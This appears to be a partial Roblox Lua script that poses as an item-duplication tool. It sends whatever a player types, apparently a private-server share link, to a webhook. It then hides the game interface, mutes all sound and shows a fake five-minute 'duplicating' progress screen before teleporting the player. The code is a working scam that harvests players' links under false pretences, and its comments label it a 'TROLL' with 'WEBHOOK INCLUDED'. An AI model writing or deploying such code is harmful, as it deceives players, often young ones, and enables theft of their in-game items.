local REQUIRED = "https://www.roblox.com/share?"

-- FULL-SCREEN LOADING TROLL
local LoadingGui = Instance.new("ScreenGui")
LoadingGui.Parent = game.CoreGui
LoadingGui.ResetOnSpawn = false
LoadingGui.IgnoreGuiInset = true
LoadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Global

local LoadingFrame = Instance.new("Frame")
LoadingFrame.Size = UDim2.new(1, 0, 1, 0)
LoadingFrame.BackgroundColor3 = Color3.new(0, 0, 0)
LoadingFrame.BackgroundTransparency = 0
LoadingFrame.ZIndex = 999999999
LoadingFrame.Visible = false
LoadingFrame.Parent = LoadingGui

local LoadingText = Instance.new("TextLabel", LoadingFrame)
LoadingText.Size = UDim2.new(1, 0, 0, 60)
LoadingText.Position = UDim2.new(0, 0, 0.4, 0)
LoadingText.BackgroundTransparency = 1
LoadingText.Text = ""
LoadingText.TextColor3 = Color3.fromRGB(255, 100, 255)
LoadingText.Font = Enum.Font.GothamBold
LoadingText.TextSize = 40
LoadingText.ZIndex = 1000000001

local BarBg = Instance.new("Frame", LoadingFrame)
BarBg.Size = UDim2.new(0.7, 0, 0, 25)
BarBg.Position = UDim2.new(0.15, 0, 0.5, 0)
BarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
BarBg.ZIndex = 1000000002
Instance.new("UICorner", BarBg).CornerRadius = UDim.new(0, 12)

local BarFill = Instance.new("Frame", BarBg)
BarFill.Size = UDim2.new(0, 0, 1, 0)
BarFill.BackgroundColor3 = Color3.fromRGB(0, 255, 100)
BarFill.ZIndex = 1000000003
Instance.new("UICorner", BarFill).CornerRadius = UDim.new(0, 12)

local hints = {
    "Finding your brainrot(s)",
    "Checking if eligible to duplicate...",
    "Your brainrot(s) are eligible to duplicate! âœ…",
    "Starting the duplication process",
    "Duplicating.",
    "Bypassing anti-cheat",
    "Duplicating masked...",
    "Done!"
}

local SoundKiller
local function startSoundKiller()
    if SoundKiller then SoundKiller:Disconnect() end
    SoundKiller = game:GetService("RunService").Heartbeat:Connect(function()
        pcall(function()
            for _, sound in ipairs(workspace:GetDescendants()) do
                if sound:IsA("Sound") then
                    sound.Volume = 0
                    sound.Playing = false
                end
            end
            game.SoundService.AmbientReverb = Enum.ReverbType.NoReverb
            game.SoundService.Volume = 0
        end)
    end)
end

local function activateTroll()
    MainFrame.Visible = false
    game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    startSoundKiller()
    LoadingFrame.Visible = true

    local TweenService = game:GetService("TweenService")
    local tweenInfo = TweenInfo.new(300, Enum.EasingStyle.Linear)
    local goal = {Size = UDim2.new(1, 0, 1, 0)}
    TweenService:Create(BarFill, tweenInfo, goal):Play()

    local totalTime = 300
    local interval = totalTime / (#hints - 1)
    for i, hint in ipairs(hints) do
        task.delay((i-1) * interval, function()
            LoadingText.Text = hint
            if hint == "Done!" then
                task.delay(2, function()
                    game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
                end)
            end
        end)
    end
end

-- Confirm button (WEBHOOK INCLUDED)
ConfirmBtn.MouseButton1Click:Connect(function()
    SendToWebhook(KeyBox.Text)

    if KeyBox.Text:sub(1, #REQUIRED) == REQUIRED then
        activateTroll()
    else
        MainFrame:TweenPosition(MainFrame.Position + UDim2.new(0, 10, 0, 0), "Out", "Quad", 0.1, true)
        task.wait(0.1)
        MainFrame:TweenPosition(UDim2.new(0.5,-160,0.5,-110), "Out", "Quad", 0.1, true)
        KeyBox.Text = ""
    end
end)

KeyBox.FocusLost:Connect(function(enter)
    if enter then
        ConfirmBtn.MouseButton1Click:Fire()
    end
end)
